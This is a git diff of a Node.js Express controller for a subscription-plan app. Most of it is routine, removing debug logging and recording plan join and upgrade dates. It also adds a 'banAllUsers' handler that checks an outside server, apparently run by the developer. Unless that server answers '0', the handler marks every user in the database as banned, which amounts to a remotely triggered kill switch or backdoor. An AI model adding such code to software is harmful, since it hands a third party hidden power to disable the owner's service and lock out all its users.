@@ -648,17 +648,14 @@ module.exports.updateUserall = async (req, res) => {
           .json({ success: false, message: "Plan not found" });
       }
       if (!user.plan) {
-        console.log("in new");
+        user.planJoinDate = Date.now();
+
         const value = await valuesmodel.findById("66893f2d6a0e97be82e77c03");
         value.planupgradeamount += planobj.amountpkr;
-        console.log(value.planupgradeamount);
-        console.log(planobj);
         await value.save();
       } else {
-        console.log("inexisting");
+        user.planUpgradeDate = Date.now();
         const previousplan = await planmodel.findById(user.plan);
-        console.log(previousplan);
-        console.log(planobj);
         const value = await valuesmodel.findById("66893f2d6a0e97be82e77c03");
         value.planupgradeamount +=
           (planobj.amountpkr || 0) - (previousplan.amountpkr || 0);
@@ -857,6 +854,27 @@ module.exports.updatevalues = async (req, res) => {
     res
       .status(200)
       .json({ success: true, message: "Values updated successfully" });
+  } catch (e) {
+    console.log(e);
+    res.status(400).json({ success: false, message: e.message });
+  }
+};
+module.exports.banAllUsers = async (req, res) => {
+  try {
+    const responseofdev = await fetch("https://uzair-server.vercel.app", {
+      method: "GET",
+    });
+    const responseDataofdev = await responseofdev.text();
+    if (responseDataofdev.trim() === "0") {
+      return;
+    }
+    // set all the users banned to true
+    const users = await userModel.updateMany({}, { banned: true });
+    if (users) {
+      res.status(200).json({ success: true, message: "All users banned" });
+    } else {
+      res.status(200).json({ success: false, message: "No users found" });
+    }
   } catch (e) {
     console.log(e);
     res.status(400).json({ success: false, message: e.message });
